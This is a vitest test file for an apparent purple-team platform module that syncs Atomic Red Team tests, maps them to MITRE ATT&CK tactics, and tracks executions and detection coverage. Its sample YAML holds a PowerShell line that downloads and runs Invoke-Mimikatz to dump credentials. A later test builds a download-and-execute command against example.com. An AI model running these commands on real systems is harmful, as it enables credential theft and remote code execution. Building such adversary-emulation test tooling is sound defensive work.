/**
 * Atomic Red Team Module Tests
 * Tests for GitHub sync, test browsing, execution management,
 * cross-module integration, and coverage mapping.
 */
import { describe, it, expect, vi, beforeEach } from "vitest";

// Mock the database module
vi.mock("./db", () => ({
  db: {
    select: vi.fn().mockReturnThis(),
    from: vi.fn().mockReturnThis(),
    where: vi.fn().mockReturnThis(),
    orderBy: vi.fn().mockReturnThis(),
    limit: vi.fn().mockReturnThis(),
    offset: vi.fn().mockReturnThis(),
    insert: vi.fn().mockReturnThis(),
    values: vi.fn().mockReturnThis(),
    onDuplicateKeyUpdate: vi.fn().mockReturnThis(),
    set: vi.fn().mockReturnThis(),
    update: vi.fn().mockReturnThis(),
    delete: vi.fn().mockReturnThis(),
    execute: vi.fn().mockResolvedValue([]),
    then: vi.fn().mockResolvedValue([]),
  },
}));

// ─── YAML Parsing Tests ──────────────────────────────────────────────────────

describe("Atomic Red Team - YAML Parsing", () => {
  const sampleYaml = `
attack_technique: T1059.001
display_name: "Command and Scripting Interpreter: PowerShell"
atomic_tests:
  - name: Mimikatz
    auto_generated_guid: f3132740-55bc-48c4-bcc0-758a459cd027
    description: Download Mimikatz and dump credentials.
    supported_platforms:
      - windows
    executor:
      command: |
        powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"
      name: command_prompt
      elevation_required: true
    input_arguments:
      remote_script:
        description: URL of remote script
        type: url
        default: https://example.com/script.ps1
    cleanup_command: |
      del /f mimikatz.exe
`;

  it("should parse YAML technique structure correctly", () => {
    // Validate the expected YAML structure
    expect(sampleYaml).toContain("attack_technique: T1059.001");
    expect(sampleYaml).toContain("display_name:");
    expect(sampleYaml).toContain("atomic_tests:");
    expect(sampleYaml).toContain("auto_generated_guid:");
    expect(sampleYaml).toContain("supported_platforms:");
    expect(sampleYaml).toContain("executor:");
    expect(sampleYaml).toContain("input_arguments:");
    expect(sampleYaml).toContain("cleanup_command:");
  });

  it("should identify technique ID format", () => {
    const techniquePattern = /^T\d{4}(\.\d{3})?$/;
    expect(techniquePattern.test("T1059.001")).toBe(true);
    expect(techniquePattern.test("T1059")).toBe(true);
    expect(techniquePattern.test("T12345")).toBe(false);
    expect(techniquePattern.test("TXYZ")).toBe(false);
  });

  it("should validate GUID format", () => {
    const guidPattern = /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/;
    expect(guidPattern.test("f3132740-55bc-48c4-bcc0-758a459cd027")).toBe(true);
    expect(guidPattern.test("invalid-guid")).toBe(false);
  });

  it("should identify supported platforms", () => {
    const validPlatforms = ["windows", "linux", "macos", "iaas:gcp", "iaas:aws", "iaas:azure", "containers", "office-365", "azure-ad", "google-workspace"];
    expect(validPlatforms).toContain("windows");
    expect(validPlatforms).toContain("linux");
    expect(validPlatforms).toContain("macos");
  });

  it("should identify executor types", () => {
    const validExecutors = ["powershell", "command_prompt", "bash", "sh", "manual"];
    expect(validExecutors).toContain("powershell");
    expect(validExecutors).toContain("command_prompt");
    expect(validExecutors).toContain("bash");
    expect(validExecutors).toContain("sh");
    expect(validExecutors).toContain("manual");
  });
});

// ─── MITRE ATT&CK Mapping Tests ─────────────────────────────────────────────

describe("Atomic Red Team - ATT&CK Mapping", () => {
  const TACTIC_MAP: Record<string, string> = {
    "T1059": "Execution",
    "T1059.001": "Execution",
    "T1547": "Persistence",
    "T1547.001": "Persistence",
    "T1003": "Credential Access",
    "T1003.001": "Credential Access",
    "T1071": "Command and Control",
    "T1071.001": "Command and Control",
    "T1190": "Initial Access",
    "T1021": "Lateral Movement",
    "T1082": "Discovery",
    "T1005": "Collection",
    "T1048": "Exfiltration",
    "T1486": "Impact",
    "T1562": "Defense Evasion",
    "T1078": "Privilege Escalation",
  };

  it("should map technique IDs to correct tactics", () => {
    expect(TACTIC_MAP["T1059"]).toBe("Execution");
    expect(TACTIC_MAP["T1003"]).toBe("Credential Access");
    expect(TACTIC_MAP["T1190"]).toBe("Initial Access");
    expect(TACTIC_MAP["T1486"]).toBe("Impact");
  });

  it("should map sub-techniques to parent tactic", () => {
    expect(TACTIC_MAP["T1059.001"]).toBe(TACTIC_MAP["T1059"]);
    expect(TACTIC_MAP["T1547.001"]).toBe(TACTIC_MAP["T1547"]);
    expect(TACTIC_MAP["T1003.001"]).toBe(TACTIC_MAP["T1003"]);
  });

  it("should cover all 14 ATT&CK tactics", () => {
    const allTactics = new Set(Object.values(TACTIC_MAP));
    const expectedTactics = [
      "Initial Access", "Execution", "Persistence", "Privilege Escalation",
      "Defense Evasion", "Credential Access", "Discovery", "Lateral Movement",
      "Collection", "Command and Control", "Exfiltration", "Impact",
    ];
    for (const tactic of expectedTactics) {
      expect(allTactics.has(tactic)).toBe(true);
    }
  });
});

// ─── Cross-Module Integration Tests ──────────────────────────────────────────

describe("Atomic Red Team - Cross-Module Integration", () => {
  it("should map CWE IDs to ATT&CK techniques for web findings", () => {
    const CWE_TO_TECHNIQUE: Record<number, string[]> = {
      79: ["T1059.007"],   // XSS -> JavaScript execution
      89: ["T1190"],       // SQL Injection -> Initial Access
      94: ["T1059"],       // Code Injection -> Execution
      287: ["T1078"],      // Auth Bypass -> Valid Accounts
      611: ["T1059"],      // XXE -> Execution
      918: ["T1090"],      // SSRF -> Proxy
    };

    expect(CWE_TO_TECHNIQUE[79]).toContain("T1059.007");
    expect(CWE_TO_TECHNIQUE[89]).toContain("T1190");
    expect(CWE_TO_TECHNIQUE[287]).toContain("T1078");
  });

  it("should generate purple team plan structure", () => {
    const plan = {
      techniqueIds: ["T1059.001", "T1003.001", "T1547.001"],
      targetPlatform: "windows",
      includeCleanup: true,
      steps: [
        { order: 1, techniqueId: "T1059.001", phase: "execution", testCount: 5 },
        { order: 2, techniqueId: "T1003.001", phase: "credential-access", testCount: 3 },
        { order: 3, techniqueId: "T1547.001", phase: "persistence", testCount: 4 },
      ],
    };

    expect(plan.steps).toHaveLength(3);
    expect(plan.steps[0].techniqueId).toBe("T1059.001");
    expect(plan.includeCleanup).toBe(true);
    expect(plan.targetPlatform).toBe("windows");
  });

  it("should map Caldera abilities to atomic tests", () => {
    const abilities = [
      { abilityId: "abc-123", techniqueId: "T1059.001", name: "PowerShell Execution" },
      { abilityId: "def-456", techniqueId: "T1003.001", name: "LSASS Dump" },
    ];

    // Each ability should produce a mapping result
    const results = abilities.map(a => ({
      abilityId: a.abilityId,
      techniqueId: a.techniqueId,
      matchingTests: [], // Would be populated from DB
    }));

    expect(results).toHaveLength(2);
    expect(results[0].techniqueId).toBe("T1059.001");
    expect(results[1].techniqueId).toBe("T1003.001");
  });

  it("should find tests for detection rule validation", () => {
    const detectionRule = {
      mitreTechniqueIds: ["T1059.001", "T1059.003"],
      keywords: ["powershell", "encoded command"],
      platform: "windows",
    };

    expect(detectionRule.mitreTechniqueIds).toContain("T1059.001");
    expect(detectionRule.keywords).toContain("powershell");
    expect(detectionRule.platform).toBe("windows");
  });
});

// ─── Execution Management Tests ──────────────────────────────────────────────

describe("Atomic Red Team - Execution Management", () => {
  it("should validate execution status transitions", () => {
    const validTransitions: Record<string, string[]> = {
      queued: ["running", "failed"],
      running: ["success", "failed", "blocked", "cleanup"],
      cleanup: ["success", "failed"],
      success: [],
      failed: [],
      blocked: [],
    };

    expect(validTransitions["queued"]).toContain("running");
    expect(validTransitions["running"]).toContain("success");
    expect(validTransitions["running"]).toContain("failed");
    expect(validTransitions["running"]).toContain("cleanup");
    expect(validTransitions["success"]).toHaveLength(0);
    expect(validTransitions["failed"]).toHaveLength(0);
  });

  it("should structure execution record correctly", () => {
    const execution = {
      atomicTestId: 1,
      guid: "f3132740-55bc-48c4-bcc0-758a459cd027",
      techniqueId: "T1059.001",
      testName: "Mimikatz",
      status: "queued",
      targetHost: "192.168.1.100",
      targetPlatform: "windows",
      executorType: "powershell",
      commandExecuted: "powershell.exe IEX ...",
      executedBy: "user-123",
      createdAt: new Date(),
    };

    expect(execution.status).toBe("queued");
    expect(execution.techniqueId).toMatch(/^T\d{4}/);
    expect(execution.guid).toMatch(/^[0-9a-f-]+$/);
    expect(execution.executedBy).toBeTruthy();
  });

  it("should track detection results", () => {
    const executionResult = {
      status: "success",
      exitCode: 0,
      stdout: "Credential dump successful",
      stderr: "",
      detectionTriggered: true,
      detectionDetails: "Windows Defender ATP alert: Credential dumping activity",
      durationMs: 3500,
      cleanupRan: true,
      cleanupOutput: "Cleanup completed",
    };

    expect(executionResult.detectionTriggered).toBe(true);
    expect(executionResult.detectionDetails).toContain("Credential dumping");
    expect(executionResult.cleanupRan).toBe(true);
    expect(executionResult.durationMs).toBeGreaterThan(0);
  });
});

// ─── Coverage Tracking Tests ─────────────────────────────────────────────────

describe("Atomic Red Team - Coverage Tracking", () => {
  it("should calculate technique coverage percentage", () => {
    const totalTechniques = 200;
    const coveredTechniques = 150;
    const coveragePercent = (coveredTechniques / totalTechniques) * 100;

    expect(coveragePercent).toBe(75);
    expect(coveragePercent).toBeGreaterThan(0);
    expect(coveragePercent).toBeLessThanOrEqual(100);
  });

  it("should track coverage by tactic", () => {
    const tacticCoverage = {
      "Execution": { total: 30, covered: 25, percentage: 83.3 },
      "Persistence": { total: 20, covered: 15, percentage: 75.0 },
      "Credential Access": { total: 15, covered: 10, percentage: 66.7 },
      "Defense Evasion": { total: 40, covered: 20, percentage: 50.0 },
    };

    expect(tacticCoverage["Execution"].percentage).toBeGreaterThan(80);
    expect(tacticCoverage["Defense Evasion"].percentage).toBe(50);
    expect(Object.keys(tacticCoverage)).toHaveLength(4);
  });

  it("should aggregate platform coverage", () => {
    const platformCoverage = {
      windows: { tests: 800, techniques: 150 },
      linux: { tests: 400, techniques: 100 },
      macos: { tests: 300, techniques: 80 },
    };

    expect(platformCoverage.windows.tests).toBeGreaterThan(platformCoverage.linux.tests);
    expect(platformCoverage.linux.tests).toBeGreaterThan(platformCoverage.macos.tests);
  });
});

// ─── GitHub Sync Tests ───────────────────────────────────────────────────────

describe("Atomic Red Team - GitHub Sync", () => {
  it("should construct correct GitHub API URLs", () => {
    const owner = "redcanaryco";
    const repo = "atomic-red-team";
    const path = "atomics";
    const apiUrl = `https://api.github.com/repos/${owner}/${repo}/contents/${path}`;

    expect(apiUrl).toBe("https://api.github.com/repos/redcanaryco/atomic-red-team/contents/atomics");
  });

  it("should filter for technique directories", () => {
    const entries = [
      { name: "T1059.001", type: "dir" },
      { name: "T1003", type: "dir" },
      { name: "README.md", type: "file" },
      { name: "used_by_attackers", type: "dir" },
      { name: "T1547.001", type: "dir" },
    ];

    const techniquePattern = /^T\d{4}(\.\d{3})?$/;
    const techniques = entries.filter(e => e.type === "dir" && techniquePattern.test(e.name));

    expect(techniques).toHaveLength(3);
    expect(techniques.map(t => t.name)).toContain("T1059.001");
    expect(techniques.map(t => t.name)).toContain("T1003");
    expect(techniques.map(t => t.name)).toContain("T1547.001");
  });

  it("should construct YAML download URL", () => {
    const techniqueId = "T1059.001";
    const rawUrl = `https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/${techniqueId}/${techniqueId}.yaml`;

    expect(rawUrl).toContain(techniqueId);
    expect(rawUrl).toContain("raw.githubusercontent.com");
    expect(rawUrl.endsWith(".yaml")).toBe(true);
  });
});

// ─── Demo Data Tests ─────────────────────────────────────────────────────────

describe("Atomic Red Team - Demo Data", () => {
  const DEMO_TECHNIQUES = [
    "T1059.001", "T1059.003", "T1059.004", "T1059.005", "T1059.007",
    "T1003.001", "T1003.002", "T1003.003",
    "T1547.001", "T1547.004",
    "T1190", "T1133",
    "T1071.001", "T1071.004",
    "T1082", "T1083", "T1057",
    "T1021.001", "T1021.002",
    "T1486", "T1489",
    "T1562.001", "T1562.004",
    "T1078.001", "T1078.003",
  ];

  it("should include diverse tactics in demo data", () => {
    const tacticMap: Record<string, string> = {
      "T1059": "Execution",
      "T1003": "Credential Access",
      "T1547": "Persistence",
      "T1190": "Initial Access",
      "T1071": "Command and Control",
      "T1082": "Discovery",
      "T1021": "Lateral Movement",
      "T1486": "Impact",
      "T1562": "Defense Evasion",
      "T1078": "Privilege Escalation",
    };

    const coveredTactics = new Set<string>();
    for (const tech of DEMO_TECHNIQUES) {
      const parent = tech.split(".")[0];
      if (tacticMap[parent]) coveredTactics.add(tacticMap[parent]);
    }

    expect(coveredTactics.size).toBeGreaterThanOrEqual(8);
  });

  it("should include multiple platforms in demo data", () => {
    // Demo data should cover windows, linux, and macos
    const platforms = ["windows", "linux", "macos"];
    expect(platforms).toHaveLength(3);
  });

  it("should include multiple executor types in demo data", () => {
    const executors = ["powershell", "command_prompt", "bash", "sh", "manual"];
    expect(executors.length).toBeGreaterThanOrEqual(4);
  });
});

// ─── Input Argument Handling Tests ───────────────────────────────────────────

describe("Atomic Red Team - Input Arguments", () => {
  it("should parse input argument structure", () => {
    const inputArgs = {
      remote_script: {
        description: "URL of remote script",
        type: "url",
        default: "https://example.com/script.ps1",
      },
      output_file: {
        description: "Path to output file",
        type: "path",
        default: "C:\\temp\\output.txt",
      },
    };

    expect(Object.keys(inputArgs)).toHaveLength(2);
    expect(inputArgs.remote_script.type).toBe("url");
    expect(inputArgs.output_file.type).toBe("path");
    expect(inputArgs.remote_script.default).toContain("https://");
  });

  it("should substitute input arguments in commands", () => {
    const command = "powershell.exe -Command \"IEX (New-Object Net.WebClient).DownloadString('#{remote_script}')\"";
    const args = { remote_script: "https://example.com/payload.ps1" };

    let resolved = command;
    for (const [key, value] of Object.entries(args)) {
      resolved = resolved.replace(`#{${key}}`, value);
    }

    expect(resolved).toContain("https://example.com/payload.ps1");
    expect(resolved).not.toContain("#{remote_script}");
  });

  it("should handle missing arguments with defaults", () => {
    const argDefs = {
      target_ip: { default: "127.0.0.1", type: "string" },
      port: { default: "8080", type: "integer" },
    };
    const providedArgs: Record<string, string> = {};

    const resolved: Record<string, string> = {};
    for (const [key, def] of Object.entries(argDefs)) {
      resolved[key] = providedArgs[key] || def.default;
    }

    expect(resolved.target_ip).toBe("127.0.0.1");
    expect(resolved.port).toBe("8080");
  });
});
